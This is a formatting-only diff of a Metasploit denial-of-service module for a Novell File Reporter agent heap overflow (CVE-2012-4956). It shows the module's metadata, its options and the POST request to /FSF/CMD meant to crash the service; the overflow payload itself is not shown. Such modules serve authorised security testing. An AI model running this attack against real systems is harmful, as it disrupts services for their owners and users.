@@ -8,29 +8,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'NFR Agent Heap Overflow Vulnerability',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'NFR Agent Heap Overflow Vulnerability',
+        'Description' => %q{
           This module exploits a heap overflow in NFRAgent.exe, a component of Novell
-        File Reporter (NFR). The vulnerability occurs when handling requests of name "SRS",
-        where NFRAgent.exe fails to generate a response in a secure way, copying user
-        controlled data into a fixed-length buffer in the heap without bounds checking.
-        This module has been tested against NFR Agent 1.0.4.3 (File Reporter 1.0.2).
-      },
-      'Author'         => [ 'juan vazquez' ],
-      'License'        => MSF_LICENSE,
-      'References'     => [
-        [ 'CVE', '2012-4956' ],
-        [ 'URL', 'https://blog.rapid7.com/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959' ]
-      ],
-      'DisclosureDate' => '2012-11-16'))
+          File Reporter (NFR). The vulnerability occurs when handling requests of name "SRS",
+          where NFRAgent.exe fails to generate a response in a secure way, copying user
+          controlled data into a fixed-length buffer in the heap without bounds checking.
+          This module has been tested against NFR Agent 1.0.4.3 (File Reporter 1.0.2).
+        },
+        'Author' => [ 'juan vazquez' ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          [ 'CVE', '2012-4956' ],
+          [ 'URL', 'https://blog.rapid7.com/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959' ]
+        ],
+        'DisclosureDate' => '2012-11-16'
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(3037),
         OptBool.new('SSL', [true, 'Use SSL', true])
-      ])
-
+      ]
+    )
   end
 
   def run
@@ -45,14 +49,15 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Triggering a heap overflow to cause DoS...")
 
     begin
-    res = send_request_cgi(
-      {
-        'uri'     => '/FSF/CMD',
-        'version' => '1.1',
-        'method'  => 'POST',
-        'ctype'   => "text/xml",
-        'data'    => message
-      })
+      res = send_request_cgi(
+        {
+          'uri' => '/FSF/CMD',
+          'version' => '1.1',
+          'method' => 'POST',
+          'ctype' => "text/xml",
+          'data' => message
+        }
+      )
     rescue ::Errno::ECONNRESET
       print_good("NFR Agent didn't answer, DoS seems successful")
       return
